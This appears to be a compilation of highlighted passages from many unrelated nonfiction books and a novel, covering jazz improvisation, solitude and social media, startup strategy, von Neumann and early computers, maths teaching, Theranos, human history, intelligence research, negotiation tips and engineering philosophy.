Articulation is another important device. Ghosting on-beat pitches in an eighth-note sequence creates de facto accents on every off-beat, increasing rhythmic tension. Reversing the procedure relieves rhythmic tension. Ken Mc-Intyre once suggested that I practice patterns of eighth notes by slurring and tonguing them in different groupings so that their accents fell in unpredictable sequences on and off the strong and weak portions of beats. Similarly, the varied application of hard, soft, and ghosted attacks can shift accents within a repeated eighth-note triplet, changing its perceived rhythmic configuration and its relative syncopated quality. Moreover, when articulated as alternating pairs of slurred pitches, the triplet figure assumes a polymetric relationship to the underlying meter

Equally important is musical space, accomplished through the use of substantive rests, the unvoiced rhythmic trailers whose irregular time spans offset those of the phrases that precede and follow them. In effect, rests introduce soft accents into the solo line as its sound subsides and the rhythm section temporarily moves to the foreground of the music. Suspended over the passing beats, a rest also invites listeners to reflect upon the soloist’s most recent figure, challenging them to anticipate the entrances of subsequent figures. Musicians commonly cite Miles Davis as an inspired model for the effective use of space, which increases the potency of his phrases and heightens their dramatic quality.

seasoned soloists can similarly enter a piece’s progression at a designated tempo and keep track of their metered progress through the form while taking great rhythmic liberties. Playing inside the time, they double up or triple up on the tempo—improvising patterns precisely twice or three times as fast as the beat. In other instances, mathematical calculation guides excursions outside the time. Superimposed metric frames aid in placing pitches with great rhythmic accuracy at finely distinguished, abstract points in relation to the underlying meter, thereby creating subtle patterns of syncopation and polymetric activity.

For learners, the discovery of scales and their theoretical relationship to chords constitutes a major conceptual breakthrough with immediate application. They can construct a scale or mode that is compatible with each chord by filling in the diatonic pitches between its tones, increasing the chord’s associated pitch collection from four to seven, and grouping optional tonal materials together as a string of neighboring notes.

“When a dominant seventh chord moves, resolves down a fifth, like it should properly,” Emily Remler explains, “you can use the jazz minor scale up a half step from the root of the dominant seventh.” A case in point is the movement from G7 to C major, which invites the use of the A jazz minor scale. “That gives you all the best tensions to use upon it—sharp eleven, flat nine.”

another theoretical approach to improvisation emphasizing intervals as compositional models. Musicians sometimes use particular interval arrangements derived from chords as threads in their performances, transposing them to complement the piece’s progression. At other times, they favor interval sequences that weave in and out of diatonic harmony. “Today, you can use one interval like a fourth and play it anywhere,” Benny Bailey says. “Even if all the notes don’t fit the chords, the ear accepts them because they’re a complete pattern of fourths. Like on a C7 chord, you can play E, A, D, and Gs, and it won’t sound too far out, even though the notes are not in the chord.

thinking in terms of interval patterns enables musicians to call up alternative sets of pitches having different harmonic relationships to the underlying chords. By pursuing Bailey’s example, the soloist formulates a melody from the flatted-third, flatted-fifth, raised-fifth, and flatted-ninth degrees, deliberately avoiding the chord tones and producing relatively high harmonic tension. If the same interval sequence were built on the chord’s tonic, the resulting phrase would include two chord tones—the tonic and the flatted seventh—and produce comparatively less harmonic tension.

Maybe, one time through the tune, you play all the first inversions of the chords, just for their sound; then you play all the second inversions for a different sound. Starting on a certain note and going to another note within the same chords gives a different texture to the solo. You listen to what it sounds like one way, and then you say, “I wonder what it would sound like if I switch it around.” There are so many different ways to switch chords around.

Improvising is a singing, whistling phenomenon when it’s really happening. It’s the expression of the sound that you can conceptualize on your own steam. It’s a matter of getting intricately and sophisticatedly involved with a melodic line so that it is one with the performer.” New Orleans trumpeter Mutt Carey elaborates, “When I’m improvising, I’m singing in my mind.

If you could jump out of a chord, you could always jump back in. That was a trick I learned from listening to Louis Armstrong and many of the New Orleans musicians like Joe Oliver and Jimmie Noone. You hear the same thing if you listen to trumpet players like Clifford Brown play melodies.19 They call what they use grace notes. Theoretically, they call them neighboring tones, and they’re beautiful. So, if you play a solo and you’re smart, you can jump out of those chords and jump back in by using those. You’ve got your half neighbors and your whole neighbors, so you can get three notes out of the way and still come back in there. All those things come to me when I’m playing.

invention is not simply discovering how to make something; an inventor must also connect his or her invention with society. In some situations, needs are well-known and society readily takes up a new invention. Since railroads in the mid-nineteenth century needed stronger rails and armies wanted stronger cannon barrels, there was a ready demand for Henry Bessemer’s new steel-making process in 1856. In other situations, though, there is no preexisting need and an inventor must convince society of an invention’s value. For example, when Alexander Graham Bell invented the telephone in 1876, he found few people willing to buy it; indeed, it took the Bell Telephone Company decades to convince Americans that every home should have a telephone. Bell and his successor companies had to invent not only the telephone but also a marketing strategy that reflected the interests of users. In this sense, inventors “negotiate” with society.

Thoreau’s purpose in these tables is to capture precisely (not poetically or philosophically) how much it cost to support his life at Walden Pond—a lifestyle that, as he argues at length in this first chapter, satisfies all the basic human needs: food, shelter, warmth, and so on. Thoreau then contrasts these costs with the hourly wages he could earn with his labor to arrive at the final value he cared most about: How much of his time must be sacrificed to support his minimalist lifestyle? After plugging in the numbers gathered during his experiment, he determined that hiring out his labor only one day per week would be sufficient.

Storr’s conclusion is that we’re wrong to consider intimate interaction as the sine qua non of human thriving. Solitude can be just as important for both happiness and productivity.

Take these walks alone, which means not just by yourself, but also, if possible, without your phone. If you’re wearing headphones, or monitoring a text message chain, or, God forbid, narrating the stroll on Instagram—you’re not really walking, and therefore you’re not going to experience this practice’s greatest benefits.

Many others, both today and historically, enjoy the same benefits that come from this substantial injection of solitude into an otherwise hectic life. Thoreau once wrote: I think that I cannot preserve my health and spirits, unless I spend four hours a day at least—and it is commonly more than that—sauntering through the woods and over the hills and fields, absolutely free from all worldly engagements. Most of us will never meet Thoreau’s ambitious commitment to ambulation.

The problem, then, is not that using social media directly makes us unhappy. Indeed, as the positive studies cited above found, certain social media activities, when isolated in an experiment, modestly boost well-being. The key issue is that using social media tends to take people away from the real-world socializing that’s massively more valuable. As the negative studies imply, the more you use social media, the less time you tend to devote to offline interaction, and therefore the worse this value deficit becomes—leaving the heaviest social media users much more likely to be lonely and miserable

What differentiates this club from similar organizations is the books themselves, which are custom printed in a compact booklet that’s roughly the height and width of a smartphone. This size is intentional. The philosophy behind a Mouse Book is that it can fit into your pocket next to your phone. Whenever you feel the urge to pull out your phone for a quick hit of distraction, you can instead pull out the Mouse Book and read a few pages of something deeper. The company describes their goal as “mobilizing literature,” and likes to point out that their portable entertainment devices “never run out of battery life, their ‘screens’ never crack, and they don’t ring, buzz, or vibrate.”

When Franklin returned from London to Philadelphia in 1726, he faced a barren social life. Having grown up in Boston, Franklin had no family roots in his adopted home, and his skepticism of religious dogma eliminated the option of joining a ready-made community through the church. Undeterred, he decided he would simply start the social organizations he desired from scratch.

The market high of March 2000 was obviously a peak of insanity; less obvious but more important, it was also a peak of clarity.

why do people believe that competition is healthy? The answer is that competition is not just an economic concept or a simple inconvenience that individuals and companies must deal with in the marketplace. More than anything else, competition is an ideology—the ideology—that pervades our society and distorts our thinking. We preach competition, internalize its necessity, and enact its commandments; and as a result, we trap ourselves within it—even though the more we compete, the less we gain.

This is a simple truth, but we’ve all been trained to ignore it. Our educational system both drives and reflects our obsession with competition. Grades themselves allow precise measurement of each student’s competitiveness; pupils with the highest marks receive status and credentials. We teach every young person the same subjects in mostly the same ways, irrespective of individual talents and preferences. Students who don’t learn best by sitting still at a desk are made to feel somehow inferior, while children who excel on conventional measures like tests and assignments end up defining their identities in terms of this weirdly contrived academic parallel reality.

To Shakespeare, by contrast, all combatants look more or less alike. It’s not at all clear why they should be fighting, since they have nothing to fight about. Consider the opening line from Romeo and Juliet: “Two households, both alike in dignity.” The two houses are alike, yet they hate each other. They grow even more similar as the feud escalates. Eventually, they lose sight of why they started fighting in the first place. In the world of business, at least, Shakespeare proves the superior guide. Inside a firm, people become obsessed with their competitors for career advancement. Then the firms themselves become obsessed with their competitors in the marketplace. Amid all the human drama, people lose sight of what matters and focus on their rivals instead.

The hazards of imitative competition may partially explain why individuals with an Asperger’s-like social ineptitude seem to be at an advantage in Silicon Valley today. If you’re less sensitive to social cues, you’re less likely to do the same things as everyone else around you. If you’re interested in making things or programming computers, you’ll be less afraid to pursue those activities single-mindedly and thereby become incredibly good at them. Then when you apply your skills, you’re a little less likely than others to give up your own convictions: this can save you from getting caught up in crowds competing for obvious prizes.

Proprietary technology is the most substantive advantage a company can have because it makes your product difficult or impossible to replicate. Google’s search algorithms, for example, return results better than anyone else’s. Proprietary technologies for extremely short page load times and highly accurate query autocompletion add to the core search product’s robustness and defensibility.

Many businesses gain only limited advantages as they grow to large scale. Service businesses especially are difficult to make monopolies. If you own a yoga studio, for example, you’ll only be able to serve a certain number of customers. You can hire more instructors and expand to more locations, but your margins will remain fairly low and you’ll never reach a point where a core group of talented people can provide something of value to millions of separate clients, as software engineers are able to do.

Beginning with brand rather than substance is dangerous. Ever since Marissa Mayer became CEO of Yahoo! in mid-2012, she has worked to revive the once-popular internet giant by making it cool again. In a single tweet, Yahoo! summarized Mayer’s plan as a chain reaction of “people then products then traffic then revenue.” The people are supposed to come for the coolness: Yahoo! demonstrated design awareness by overhauling its logo, it asserted youthful relevance by acquiring hot startups like Tumblr, and it has gained media attention for Mayer’s own star power. But the big question is what products Yahoo! will actually create. When Steve Jobs returned to Apple, he didn’t just make Apple a cool place to work; he slashed product lines to focus on the handful of opportunities for 10x improvements. No technology company can be built on branding alone.

Every startup is small at the start. Every monopoly dominates a large share of its market. Therefore, every startup should start with a very small market. Always err on the side of starting too small. The reason is simple: it’s easier to dominate a small market than a large one. If you think your initial market might be too big, it almost certainly is.

In the late 1940s, a Californian named John Reber set out to reinvent the physical geography of the whole San Francisco Bay Area. Reber was a schoolteacher, an amateur theater producer, and a self-taught engineer. Undaunted by his lack of credentials, he publicly proposed to build two huge dams in the Bay, construct massive freshwater lakes for drinking water and irrigation, and reclaim 20,000 acres of land for development. Even though he had no personal authority, people took the Reber Plan seriously. It was endorsed by newspaper editorial boards across California. The U.S. Congress held hearings on its feasibility. The Army Corps of Engineers even constructed a 1.5-acre scale model of the Bay in a cavernous Sausalito warehouse to simulate it. These tests revealed technical shortcomings, so the plan wasn’t executed. But would anybody today take such a vision seriously in the first place? In the 1950s, people welcomed big plans and asked whether they would work. Today a grand plan coming from a schoolteacher would be dismissed as crankery, and a long-range vision coming from anyone more powerful would be derided as hubris. You can still visit the Bay Model in that Sausalito warehouse, but today it’s just a tourist attraction: big plans for the future have become archaic curiosities.

Technological advance seemed to accelerate automatically, so the Boomers grew up with great expectations but few specific plans for how to fulfill them. Then, when technological progress stalled in the 1970s, increasing income inequality came to the rescue of the most elite Boomers. Every year of adulthood continued to get automatically better and better for the rich and successful. The rest of their generation was left behind, but the wealthy Boomers who shape public opinion today see little reason to question their naïve optimism.

Start a place, call it . . . Magic Brew. I like that. We do a lit le advertising. Magic Brew, the witch's brew! Colder than a witch's . . . heart. How's that sound, Senna?"  No answer.  It was a tense little group. I found I was grateful to Christopher, though. He was managing to make clear our dislike for Senna while nevertheless treating her as part of our group.  Acknowledging the schism, and at the same time papering it over.  Senna

Senna could have made it easier by responding. Even if she'd slammed Christopher. But Senna understood the real-world magic of humor. She knew that Christopher was attempting to redefine her. She wasn't having it.

After playing a wrong note, for instance, I would quickly resolve it to a proper note—but then I took to repeating my mistakes (a simple matter, since the music was built out of repeating modules, or strophes) in order to resolve them differently each time. I soon began to see the dissonances caused by wrong notes, or right notes in the wrong place, as opportunities rather than liabilities—new ways to create tension and release, the lifeblood of music.

This warehouse was probably the scuzziest place I ever had to play. There was all kinds of description-defying debris lying about (mostly in the corners, thank goodness). High windows let through brown light, even in the middle of the day. The concrete floors, walls, ceiling, and pillars were all painted with a faded hepatitis yellow, which reminded me of descriptions I’d read of the color of mustard gas. All in all, a rather poisonous atmosphere in which to attempt the transcendent, and it became apparent early on that this would not be an ecstatic experience.

Riding the rails, like running away with the circus, was a reasonable alternative to the nine-to-five gray-flannel treadmill that had consumed the majority of our contemporaries. The train spoke of freedom, of mythical journeys and heroic quests “across the immense and lonely visage of America.… [The train] making its great monotone that is the sound of suspended time.”

I was as much a part of the problem as anyone, falling into a stupefying cycle of booze and coke abuse: wake up with a hangover—have a line. Getting a little edgy—have a drink to smooth it out. Things start getting blurry—have a line or two to sharpen up the focus. Et cetera, ad infinitum. Kiss the once mighty group mind good-bye.

As the number of tourheads grew, so did a support system of vendors and merchandisers, some of whom were earning their way from show to show by selling food, drink, posters, homemade stickers, or T-shirts in the parking lot before the show. Eventually, there was a vending area, with the population of a small town, at every venue. Affectionately dubbed “Shakedown Street” by the Heads, it became as much of an attraction to locals as the show itself.

It only remained to make sure that Bob gave us a set list each show before we went on stage. Lotsa luck. At least twice Bob, that prankster, threw in a song we hadn’t rehearsed. Playing with Bob really kept us on our toes, too; he was fully capable of deviating radically from the set list, and more than once left us slack-jawed in confusion as he switched songs in midstream. That seemed like poetic justice for a band that took pride in its flexibility and in not using a set list.

He must be able to identify them both visually and aurally when he sees or hears them. 3. He must be able to conceptualize the intervals by singing, either vocally or internally. 4.

Harmonic intervals can be generally arranged on a scale from consonance to dissonance. Thirds and 6ths tend to be more consonant, 2nds and 7ths tend to be more dissonant, while 4ths and 5ths are somewhat neutral depending on the context in which they are found.

there are four excellent ways of conceiving the various modes which are as follows: 1. Find the location of the major key signature from which the mode is derived. 2. Locate the two half steps in the mode. 3. Alter a major or pure minor scale to create the mode. 4. Make adjustments to a major or minor key signature by adding or subtracting a sharp or flat.

Practice with a metronome. a. Use it as record of progress by keeping track of the most recent tempos at which you practice various problems. b. Use it to determine the evenness of running notes by setting it to “click” at the speed of various subdivisions of the beat such as triplets or sixteenth notes. c. Use it as an aid to gradually increasing the speed of technical passages. d. Use it to improve your time by having it “click” on various beats of the measure; for example, in 4/4 time, try setting it to beat all four beats, or just 1 and 3, or 2 and 4, or only the first beat of the bar, or in 3/4 set it for 2 against 3 (1 and the end of 2). e.

“Quantum mechanics,” said one physicist at Johnny’s death, “was very fortunate indeed to attract, in the first years after its discovery in 1925, the interest of a mathematical genius of von Neumann’s stature. As a result, the mathematical framework of the theory was developed and the formal aspects of its entirely novel rules of interpretation were analyzed by one single man in two years

Deep down, this apparently confident man was self-critical and rather shy. He hated arguments with anybody less intelligent than himself (i.e., almost all mankind), especially when he could crush that person with indisputable facts. He felt that crushing people was hurtful and rude and (most important) always resented. He was puzzled that most other thoughtful people had not noticed that resentment by anybody — from a Nobel Prize-winning colleague, to the president of the United States, or to a waiter — would usually hamper whatever thoughtful people wanted next to influence or do.

when the Rand Corporation asked whether his computers could be modified to tackle a particular problem, which — as Rand staff explained to him for two hours on blackboards and with graphs — would understandably be beyond computers in their present state. For two or three minutes (see that obituary in Life again), Johnny   stared so blankly that a Rand scientist later said he looked as if his mind had slipped his face out of gear. Then he said “Gentlemen, you do not need the computer, I have the answer.” While the scientists sat in stunned silence, von Neumann reeled off the various steps which would provide the solution... Having risen to this routine challenge, von Neumann followed up with a routine suggestion: Let’s go to lunch.

The slow way of answering is to calculate the distance that the fly travels on its first trip to the southbound front wheel, then the distance it travels on its next trip to the northbound wheel, and finally to sum the infinite series so obtained. It is extraordinary how many mathematicians can be fooled into doing that long sum. The short way is to note that the bicycles will meet exactly an hour after starting, by which time the 15-miles-per-hour fly must have covered 15 miles. When the question was put to Johnny, he danced and answered immediately, “15 miles.” “Oh, you’ve heard the trick before,” said the disappointed questioner. “What trick?” asked the puzzled Johnny. “I simply summed the infinite series.”

Mathematics has proved a marvelous tool for guiding developments in physics, but it is aggravating that nobody has yet managed to make such activities as psychiatry and stimulation of the human learning process into mathematically respectable professions. Johnny was worried that too few of his fellow professors could, in their own subjects, like economics, show that one thing will always follow from another.

The languages we use, he said, are clearly a historical accident, as is shown by the multiplicity of them. “Just as languages like Greek or Sanskrit are historical facts and not absolute necessities, it is only reasonable to assume that logics and mathematics are similarly historical, accidental forms of expression.” He thought that “when we talk mathematics we may be discussing a secondary language, built on the primary language truly used by the central nervous system.”

Newton’s breakthrough to the mathematization of physics, said Johnny, “brought about, and can hardly be separated from, the discovery of the infinitesimal calculus... It is therefore to be expected — or feared — that mathematical discoveries of a stature comparable to that of calculus will be needed in order to produce decisive success in this field [economic and other social science]... It is unlikely that the mere repetition of the tricks which served us so well in physics will do for social phenomena too.”

His antennae bristled with his usual suggestions for seize-the-opportunity projects, such as painting the ice caps a different color. “The persistence of large icefields,” he said, “is due to the fact that ice both reflects sunlight energy and radiates away terrestrial energy at an even higher rate than ordinary soil. Microscopic layers of colored matter spread on an icy surface, or in the atmosphere above one, could inhibit the reflection-radiation process, melt the ice and change the local climate.”

A contradiction essentially similar to that of Epimenides can be created by giving a person a piece of paper on which is written: “The statement on the other side of this paper is false.” The person turns the paper over and finds on the other side: “The statement on the other side of this paper is true.” It seemed unworthy of a grown man to spend time on such trivialities, but what was I to do?

Once people saw that two plus two always equals four, the notation existed for very clever people to find what other things always happen: in other words, for advances to other abstract proofs. Unfortunately, those clever people too often hasten to escape from us grosser folk, and to make their subject as nearly as possible a free construct of the human mind.

“There probably exists a set of conditions under which one and only one solution exists in every reasonably stated problem. However we have only surmises as to what it is and we have to be guided almost entirely by physical intuition in searching for it. It is therefore impossible to be very specific about any point. And it is difficult to say about any solution which has been derived, with any degree of assurance, that it is the one which must exist in nature.”

One expects a mathematical theorem or a mathematical theory not only to describe and classify in a simple and elegant way numerous and a priori disparate special cases. One also expects elegance in its architectural, structural make-up. The ease in stating the problem, great difficulty in getting hold of it and in all attempts at approaching it, then again some very surprising twists by which the approach, or some part of the approach, becomes easy... If the deductions are lengthy or complicated there should be some simple general principle involved, which explains the complications and details, reduces the apparent arbitrariness to a few simple guiding motivations... These criteria are clearly known to any creative art, and the existence of some underlying empirical worldly motif in the background — often in a very remote background overgrown by subsequent developments and followed into a multitude of labyrinthine variants — all this is much more akin to the atmosphere of art pure and simple than to that of the empirical sciences.

As a mathematical discipline travels far from its empirical source... it is beset with very grave dangers. It becomes more and more purely aestheticising, more and more purely l’art pour l’art. This need not be bad if the field is surrounded by correlated subjects which still have close empirical connections, or if the discipline is under the influence of men who have an exceptionally well-developed taste. But there is a grave danger that the subject will develop along the line of least resistance, that the stream so far from its source will separate into a multitude of insignificant branches, and that a discipline will become a disorganised mass of details and complexities. In other words, a great distance from its empirical source, or after much abstract inbreeding, a mathematical subject is in danger of degeneration. At the inception the style is usually classical. When it shows signs of becoming baroque, then the danger signal is up. It would be very easy to give examples, to take specific evolutions into a baroque and very high baroque... Whenever this stage is reached the only remedy seems to me to be the rejuvenating return to the source: the re-injection of more or less directly empirical ideas.

Down in her home in Kent, Miss Maud Ray, the former English governess to Bohr’s children, remained uncontacted because nobody had heard of her.

Consider two examples from Johnny himself: When he played poker he quite often lost because he felt it was boring during a relaxation to visualize too many matrices when there were better things to think about. He just stuck to the general rules that emerge from his mathematics in another paper specifically on poker playing (with many equations including the letter n). Those general rules are if you have a strong hand, always bid high; if you have a weak hand, sometimes bid high to bluff or sometimes bid low and pass; but never bid low and then see. Many thinking poker players do that anyway.

There must, thought Hollerith, be a better Jacquard-loom-like system of using a punched card for every respondent to the census: with different holes showing whether male or female, immigrant or native born, black or white, ability to speak English, parent of how many children.

By running twenty-four hours continuously, it was said that new versions of these machines might soon do in a day what could take a human with a desk calculator six months. Indeed, enthusiasts for them feared they would run too fast for their commercial good. One of the Harvard’s inventors allegedly warned that America could not have use for more than about five of his machines.

The other advantage for infant ENIAC was that Goldstine knew of Babbage’s history of never finishing anything on time. Goldstine was determined to push the project through to operational prototype even though everybody kept finding ways to make it far better — if only he would permit some extra delays. These proposals for making ENIAC better were stored for implementation only in ENIAC’s successor, which was to be called the Electronic Discrete Variable Computer (EDVAC).

Eckert and Mauchly hoped they could become rich by taking out patents on the ENIAC first and the EDVAC after. They hired patent attorneys who encouraged them, instead of instilling caution. When anything as innovatory as the computer appears, the first models nowadays usually will not make money. Customers know that the next models a few years down the road will be much better.

As we learn, our brain architecture changes and thoughts are processed differently. This means that as we move to mastery of a given skill or concept, our brains form different links in long-term memories, and it is actually possible to observe different activation patterns during problem-solving. They conclude that ‘in addition to processing efficiency, enriched representations, and structural expansions, experts can flexibly use strategies, by recruiting the associated brain regions, to solve a range of problems, whereas novice performers can not’.

The answer of £75 probably came to you almost instantly, without you really being conscious of what you had done. You immediately and unconsciously recognised the percentage sign and what it means, and you know that 25% is the same as a quarter. You have automated this knowledge, and hence it takes up no space whatsoever in your working memory. You have also automated the procedure for finding a quarter of something, so you can quickly work out a quarter of £300 by halving and halving again without imposing too much strain on your working memory. You can do all of this because you are an expert. You could also probably do this calculation if music was playing in the background, your partner was asking why you haven’t done the washing up, and you were attempting to juggle. The fact you have automated much of the knowledge necessary to answer the maths question frees up space in your working memory to attend to other things.

Does the answer arrive instantly this time? Now, this problem is likely to be cognitively demanding for both you and a novice learner. But the difference is that you have automated all the basic knowledge involved. You do not need to expend any effort contemplating what each term in the formula means, how to square 5, how to find a third, or what to do with the pi symbol. This frees up cognitive capacity to attend to more global features of the problem, such as correctly interpreting the question and devising a strategy to get to the solution. Not only are you more likely to solve the problem, you are also more likely to learn from the experience. A novice learner, who does not have the relevant knowledge automated, is likely to get bogged down in the minutiae of the problem, experience cognitive overload, and potentially not learn anything transferable.

Imagine that you are the Year 8 teacher who has inherited my class of students brought up on a diet of ‘I am thinking of a number’. What do you do? Well, your only real option is to teach students another way of solving linear equations that works for these new types of questions – probably some variant of the balance method. Then you have two choices: either tell students to abandon their old way, which they will probably be reluctant to do as it is so easy, and miles better than the new, tricky way you are trying to teach them; or give them a complex set of rules which enables them to spot which questions require which methods, which effectively means they need a different schema for each variation, and maths quickly becomes the disparate set of meaningless rules that countless scores of children and adults view it as. Either way, you are likely to be fighting a losing battle, and it is undoubtedly all my fault.

Praise should be immediate and unexpected. Praise loses much of its informational and motivational impact if the teacher praises a child for having shown good effort two weeks ago. Making praise unpredictable is hard to do, but can be of huge benefit. The goal is not simply to get the child to stop asking for praise; it is to help the child to think of their work differently – as something that is done for the student’s own satisfaction, not to garner praise from the teacher.

Holmes had had three private meetings with Murdoch. The latest had taken place earlier that month, when she’d hosted him in Palo Alto and showed him the miniLab. During the visit, she’d raised my story, telling him the information I had gathered was false and would do great damage to Theranos if it was published. Murdoch had demurred, saying he trusted the paper’s editors to handle the matter fairly.

Most of the other investors opted against litigation, settling instead for a grant of extra shares in exchange for a promise not to sue. One notable exception was Rupert Murdoch. The media mogul sold his stock back to Theranos for one dollar so he could claim a big tax write-off on his other earnings. With a fortune estimated at $12 billion, Murdoch could afford to lose more than $100 million on a bad investment.

Think of catapulting a stone across a field. It flies forward for a while and then plunges toward the ground as gravity regains the upper hand. Right until the moment of impact, the stone continues to travel forward as well as downward. Now imagine launching it with much greater force and speed, so that it disappears over the far horizon. This time, the curved surface of the earth continuously drops away beneath the stone once it starts to descend, and it never again comes back to the ground.

Death in childbirth became a major hazard for human females. Women who gave birth earlier, when the infant’s brain and head were still relatively small and supple, fared better and lived to have more children. Natural selection consequently favoured earlier births. And, indeed, compared to other animals, humans are born prematurely, when many of their vital systems are still under-developed. A colt can trot shortly after birth; a kitten leaves its mother to forage on its own when it is just a few weeks old. Human babies are helpless, dependent for many years on their elders for sustenance, protection and education.

fiction has enabled us not merely to imagine things, but to do so collectively.

Such myths give Sapiens the unprecedented ability to cooperate flexibly in large numbers. Ants and bees can also work together in huge numbers, but they do so in a very rigid manner and only with close relatives. Wolves and chimpanzees cooperate far more flexibly than ants, but they can do so only with small numbers of other individuals that they know intimately.

if you really want to understand something, the best way is to try and explain it to someone else. That forces you to sort it out in your own mind. And the more slow and dim-witted your pupil, the more you have to break things down into more and more simple ideas. And that’s really the essence of programming. By the time you’ve sorted out a complicated idea into little steps that even a stupid machine can deal with, you’ve certainly learned something about it yourself. The teacher usually learns more than the pupil.

How many young college graduates have taken demanding jobs in high-powered firms, vowing that they will work hard to earn money that will enable them to retire and pursue their real interests when they are thirty-five? But by the time they reach that age, they have large mortgages, children to school, houses in the suburbs that necessitate at least two cars per family, and a sense that life is not worth living without really good wine and expensive holidays abroad.

Rather than writing the first thing that came into their heads, they considered carefully what they wanted to say and how to phrase it. They expected to receive a similarly considered answer. Most people wrote and received no more than a handful of letters a month and seldom felt compelled to reply immediately. Today I receive dozens of emails each day, all from people who expect a prompt reply.

But the hierarchy of rich and poor – which mandates that rich people live in separate and more luxurious neighbourhoods, study in separate and more prestigious schools, and receive medical treatment in separate and better-equipped facilities – seems perfectly sensible to many Americans and Europeans. Yet it’s a proven fact that most rich people are rich for the simple reason that they were born into a rich family, while most poor people will remain poor throughout their lives simply because they were born into a poor family.

All that was left was maintenance and operation, so there was little opportunity for achieving any interesting technical results. Most people did not want to be indispensable, because they understood that in highly classified projects like this, once someone was put into a core technical position, it would be very difficult for him to be transferred out. Thus, all of them tried to deliberately hide their technical competence as they went about their jobs. Yet, they couldn’t appear too incompetent. So if the supervisor said to go east, they would work hard to move west, purposely playing the fool. Their hope was to put the following thought into the supervisor’s head: This man is working hard, but he’s limited in his skills. There’s no point in keeping him, because he’ll only get in the way. Many really did successfully obtain transfers through this method.

Another type of creativity that has been studied with regard to IQ is scientific and mathematical creativity: the sort of insight that leads to a ‘Eureka!’ moment when working on a problem. It seems that higher spatial ability – measured by, among other things, the ‘mental rotation’ task we encountered in Chapter 2 – seems to be particularly helpful (Wai et al., 2009). The kind of abstract visualization that’s required to manipulate shapes in one’s mind seems to be essential for thinking through new scientific questions.

If you measure intelligence in adulthood, almost all of the variance is explained by a combination of genes and the non-shared environment.

Outside of cases of abuse or neglect, the things that parents do don’t seem to have a strong effect on their children’s intelligence, in the long run (Harris, 2009). To put this another way, the main reason smart parents tend to have smart children is because of the genes they pass on, not because of their parenting decisions.

Peter Singer (1995). If your belief in equal rights and opportunities for all – and against racism, sexism and other kinds of discrimination – is based on there being no biological differences between people, then you’ll find it very hard to know what to do if clear evidence of biological differences actually appears. If a hundred scientific papers were published tomorrow providing bulletproof evidence that women had higher general intelligence than men, or vice versa, would this justify sexism? Of course not. It makes better sense to base one’s moral beliefs on ethical principles that are informed by, but not shackled to, the vagaries of the scientific evidence.

These guys, maybe they punched a button on a copier one time in their lives, but they had someone else do their typing and their filing. So we were trying to sell to people who really had no concept of the work this equipment was actually accomplishing.

When I was in data storage sales, my first gig out of college, I realized that most cold calls didn’t get to the intended person for one reason: gatekeepers. If I simply made all my calls from 8:00–8:30 A.M. and 6:00–6:30 P.M., for a total of one hour, I was able to avoid secretaries and book more than twice as many meetings as the senior sales executives who called from 9–5. In other words, I got twice the results for ⅛ the time.

It’s lonely at the top. Ninety-nine percent of people in the world are convinced they are incapable of achieving great things, so they aim for the mediocre. The level of competition is thus fiercest for “realistic” goals, paradoxically making them the most time- and energy-consuming. It is easier to raise $1,000,000 than it is $100,000. It is easier to pick up the one perfect 10 in the bar than the five 8s.

Don’t be the CEO or founder. Being the “CEO” or “Founder” screams start-up.

Once per day for two days, simply lie down in the middle of a crowded public place at some point. Lunchtime is ideal. It can be a well-trafficked sidewalk, the middle of a popular Starbucks, or a popular bar. There is no real technique involved. Just lie down and remain silent on the ground for about ten seconds, and then get up and continue on with whatever you were doing before. I used to do this at nightclubs to clear space for break-dancing circles. No one responded to pleading, but going catatonic on the ground did the trick.

That said, prices will be 30–70% less in the local magazines—if you have a tight budget, get a hostel employee or other local to help you make a few calls and strike a deal.

Never make a first offer when purchasing. Flinch after the first offer (“$3,000!” followed by pure silence, which uncomfortable salespeople fill by dropping the price once), let people negotiate against themselves (“Is that really the best you can offer?” elicits at least one additional drop in price), then “bracket.” If they end up at $2,000 and you want to pay $1,500, offer $1,250. They’ll counter with approximately $1,750, to which you respond: “I’ll tell you what—let’s just split the difference. I’ll overnight FedEx you a check, and we can call it a day.” The end result?

good design. In the past Engineering has been dominated to a great extent by "what can we do", but now "what do we want to do" looms greater since we now have the power to design almost anything we want. More than ever before, Engineering is a matter of choice and balance rather than just doing what can be done. And more and more it is the human factors which will determine good design—a topic which needs your serious attention at all times. 7. The effects on society are also large. The most obvious illustration is computers have given top management the power to micromanage their organization, and top management has shown little or no ability to resist using this power. You can regularly read in the papers some big corporation is decentralizing, but when you follow it for several years you see they merely intended to do so, but did not. Among other evils of micromanagement is lower management does not get the chance to make responsible decisions and learn from their mistakes, but rather because the older people finally retire then lower management finds itself as top management—without having had many real experiences in management! Furthermore, central planning has been repeatedly shown to give poor results (consider the Russian experiment for example or our own bureaucracy). The persons on the spot usually have better knowledge than can those at the top and hence can often (not always) make better decisions if things are not micromanaged. The people at the bottom

The question arises, "Is programming closer to novel writing than it is to classical engineering?" I suggest yes! Given the problem of getting a man into outer space both the Russians and the Americans did it pretty much the same way, all things considered, and allowing for some espionage. They were both limited by the same firm laws of physics. But give two novelists the problem of writing on "the greatness and misery of man", and you will probably get two very different novels (without saying just how to measure this). Give the same complex problem to two modern programmers and you will, I claim, get two rather different programs.

Do not be fooled into thinking that psychological novelty is trivial. Once the postulates, definitions, and the logic are given, then all the rest of mathematics is merely psychologically novel—at that level there is in all of mathematics technically no logical novelty! There is a common belief, if we appeal to a random source of making decisions then we escape the vicious circle of molecule banging against molecule, but from whence comes this external random source except the material world of molecules? There is also the standard claim a truly random source contains all knowledge. This is based on a variant of the monkeys and the typewriters story. Ideally you have a group of monkeys sitting at typewriters and at random times they hit random keys. It is claimed in time one of them will type all the books in the British Museum in the order in which they are on the shelves! This is based on the argument that sooner or later a monkey will hit the right first key; indeed in infinite time this will happen infinitely often. Among these infinite number of times there will be some (an infinite number) in which the next key is hit correctly. And so it goes; in the fullness of infinite time the exact sequence of key strokes will occur. This is the basis for the claim, all of knowledge resides in a truly random source, and you can get it easily if you can write a program to recognize "information". For example, sooner or later the next theory of physics will occur in the random stream of noise, and if you can recognize it you will have filtered it out of the stream of random numbers! The logic of the situation is inescapable—the reality is hardly believable! The times to wait are simply too long, and in truth you cannot always recognize "'information" even when you see it. There is an old claim, "free will" is a myth, in a given circumstance you being you as you are at the moment you can only do as you do. The argument sounds cogent, though it flies in the face of your belief you have free will. To settle the question, What experiment would you do? There seems to be no satisfactory experiment which can be done. The truth is we constantly alternate between the two positions in our behavior. A teacher has to believe if only the right words were said then the student would have to understand. And you behave similarly when raising a child. Yet the feeling of having 